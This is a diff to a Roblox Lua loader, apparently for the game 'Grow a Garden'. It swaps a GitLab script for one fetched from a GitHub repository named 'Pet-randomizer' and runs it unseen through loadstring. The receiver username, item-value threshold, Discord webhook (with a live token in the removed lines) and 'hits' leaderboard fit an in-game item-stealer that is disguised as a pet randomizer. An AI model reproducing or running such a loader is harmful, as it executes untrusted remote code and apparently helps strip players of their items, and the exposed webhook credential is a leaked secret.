@@ -1,6 +1,24 @@
-Username = "chuy_lordj"
-Webhook = "https://discord.com/api/webhooks/1494210497598193684/0NmRccXsh8-lGMK9PHdOB3zfIXq7xGbjBswhDyi7hddf8SybAsFPGuOKmiERpPqVYL49"
-MinimumValue = 1
-DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
+local function load(url)
+    local ok, res = pcall(function()
+        return game:HttpGet(url)
+    end)
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+    if not ok then
+        warn("Failed to fetch script")
+        return
+    end
+
+    local fn = loadstring(res)
+    if fn then
+        pcall(fn)
+    else
+        warn("Loadstring failed")
+    end
+end
+
+_G.Username = "chuy_lordj"
+_G.Webhook = "your_webhook_here"
+_G.MinimumValue = 1
+_G.DiscordID = "your_id"
+
+load("https://raw.githubusercontent.com/useste/Pet-randomizer/main/Nolag.lua")
